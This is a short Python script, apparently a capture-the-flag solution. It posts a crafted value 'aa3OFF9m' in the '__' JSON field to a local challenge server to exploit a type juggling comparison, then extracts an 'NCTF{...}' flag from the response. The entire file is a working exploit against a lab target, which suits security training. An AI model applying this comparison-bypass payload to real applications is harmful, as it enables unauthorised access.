import requests, json, re


'''
This code exploit type juggling attack on __ input
'''
url = "http://localhost:1007/"

payload = json.dumps({
    "__": "aa3OFF9m"
})
headers = {
    'Content-Type': 'application/json'
}

response = requests.request("POST", url, headers=headers, data=payload)

match = re.search(r'NCTF\{.*?\}', response.text)
if match:
    # Just print flag
    print(f"Flag:  {match.group(0)}")  
else:
    print("No flag found.")
